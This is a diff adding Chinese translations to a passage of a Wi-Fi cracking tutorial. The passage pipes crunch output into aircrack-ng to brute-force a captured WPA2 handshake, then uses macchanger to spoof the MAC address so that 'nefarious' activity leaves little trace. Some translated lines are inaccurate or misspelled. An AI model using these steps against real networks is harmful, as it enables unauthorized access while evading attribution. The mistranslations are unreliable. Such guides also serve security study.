@@ -188,34 +188,49 @@ We can pipe the output of `crunch` as the input to `aircrack-ng`, using the pass
 
 ```bash
 # we can also use -t "@^%," to use pattern '@' - replaced with lowercase ',' - replaced with uppercase
+# 我们也可以使用-t "@^%,"  使用模式'@' 替换小写 ',' －替换大写
 # '%' - replaced with numbers and '^' - is replaced with special chars
+# '%' －替换数字以及'^' －替换特殊字符
 # *************** don't forget '-' at the end
+# *************** 不要忘记最后的'-'
 crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
 ```
 
 Thanks to [@hiteshnayak305](https://github.com/hiteshnayak305) for the introduction to `crunch` and including this update as a [PR](https://github.com/brannondorsey/wifi-cracking/pull/17).
+感谢[@hiteshnayak305](https://github.com/hiteshnayak305)介绍`crunch`并将此次更新作为[PR](https://github.com/brannondorsey/wifi-cracking/pull/17)。
 
 ## Protecting your identify with `macchanger`
+## 利用`macchanger`魄户你的身份
 
 Whenever you are doing anything remotely nefarious with Wi-Fi, it is a good idea to spoof your the MAC address of your Wi-Fi device so that any network traffic that gets recorded can't be tied to serial assigned by your device manufacturer.
+每当您使用Wi-Fi进行任何远程恶意攻击时，最好是伪造你的Wi-Fi设备的MAC地址，以便记录的任何网络流量都不能与设备制造商分配的串行连接。
 
 This is trivial with `macchanger`:
+这是利用`macchanger`的一个小尝试：
 
 ```bash
 # download MAC changer
+# 下载MAC changer
 sudo apt-get install macchanger
 
 # bring the device down
+# 关闭设备
 sudo ifconfig wlan0 down
 
 # change the mac
 # -A pics a random MAC w/ a valid vendor
 # -r makes it truly random
 # -p restores it to the original hardware MAC
+# 改变mac
+# -A 为有效的供应商分配一个随机的MAC w/a
+# -r 让它真正随机
+# -p 将其恢复到原始的硬件MAC
 sudo macchanger -A wlan0
 
 # bring the device back up
+# 启动设备
 sudo ifconfig wlan0 up
 ```
 
 If you've got multiple cards, it might also be a good idea to do this to all of them. Or better yet, bring unused wireless interfaces down whenever you are attempting to capture handshakes, to leave as little trace as possible. Note that spoofing changes do not persist across reboots.
+如果你有多张无线网卡，那么改变所有无线网卡的MAC是个好主意。 或者更好的是，当你尝试捕获握手时，将未使用的无线接口关闭，尽可能少地留下痕迹。 请注意，欺骗更改在重新启动时不会持续。
